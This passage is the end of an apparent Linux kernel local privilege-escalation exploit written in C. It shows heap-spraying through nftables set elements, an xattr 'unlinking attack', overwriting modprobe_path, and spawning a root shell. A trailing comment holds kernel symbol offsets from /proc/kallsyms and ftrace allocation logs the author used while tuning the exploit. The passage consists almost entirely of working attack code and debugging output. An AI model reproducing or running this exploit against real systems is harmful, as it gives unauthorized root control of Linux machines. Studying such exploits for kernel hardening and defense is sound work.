    add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID, sizeof(struct write4_payload), (uint8_t *)&payload);

// 4-4 unlinking attack - release one simple_xattr
    if (removexattr(xattr_target_filename, XATTR_DELETION_NAME) < 0)  // if release succeed, means one simple_xattr->name is overflowed
        goto respray_xattr;

    printf("[+] modprobe_path changed !\n");
// 4-5 trigger modprobe
    setup_modprobe_payload();
    printf("[+] Modprobe payload setup\n");
    get_root_shell();

    wait(NULL);
    return EXIT_SUCCESS;
}

/*
(1) change offset
root@syzkaller:~# cat /proc/kallsyms | grep io_ring_ctx_ref_free
ffffffff81c4235d t io_ring_ctx_ref_free
root@syzkaller:~# cat /proc/kallsyms | grep io_rsrc_node_ref_zero
ffffffff81c42517 t io_rsrc_node_ref_zero
root@syzkaller:~# cat /proc/kallsyms | grep modprobe_path
ffffffff8286e880 D modprobe_path

root@localhost:/home/hi# cat /proc/kallsyms | grep __request_module
ffffffff810d4770 T __request_module
   0xffffffff810d47bb <__request_module+75>:	cmp    BYTE PTR [rip+0x1799e7e],0x0        # 0xffffffff8286e640 <modprobe_path>


(2) leak failed

ftrace:
         exploit-308     [000] .....    42.319031: kmalloc: call_site=strndup_user+0x46/0x60 ptr=ffff888106856f90 bytes_req=16 bytes_alloc=16 gfp_flags=GFP_USER|__GFP_NOWARN
         exploit-308     [000] .....    42.319033: kmalloc_node: call_site=kvmalloc_node+0x26/0xf0 ptr=ffff888106856c40 bytes_req=15 bytes_alloc=16 gfp_flags=GFP_KERNEL node=-1
         exploit-308     [000] .....    42.319037: kmalloc: call_site=user_preparse+0x36/0x70 ptr=ffff8881061b2c40 bytes_req=39 bytes_alloc=64 gfp_flags=GFP_KERNEL
         ...
         exploit-308     [000] .....    42.319186: kmalloc: call_site=nft_set_elem_init+0x46/0x290 ptr=ffff888101b56ae0 bytes_req=82 bytes_alloc=96 gfp_flags=GFP_KERNEL_ACCOUNT|__GFP_ZERO
         exploit-308     [000] .....    42.319190: kmalloc: call_site=nft_trans_alloc_gfp+0x22/0x60 ptr=ffff888100834000 bytes_req=288 bytes_alloc=512 gfp_flags=GFP_KERNEL|__GFP_ZERO
         exploit-308     [000] .....    42.319205: kmalloc: call_site=nft_set_elem_init+0x46/0x290 ptr=ffff8881017c92c0 bytes_req=64 bytes_alloc=64 gfp_flags=GFP_KERNEL_ACCOUNT|__GFP_ZERO
         ...
         exploit-308     [000] .....    42.355076: kmalloc: call_site=percpu_ref_init+0x6f/0x130 ptr=ffff8881061b2b40 bytes_req=56 bytes_alloc=64 gfp_flags=GFP_KERNEL|__GFP_ZERO

find that vulnerable object is in kmalloc-cg-**



*/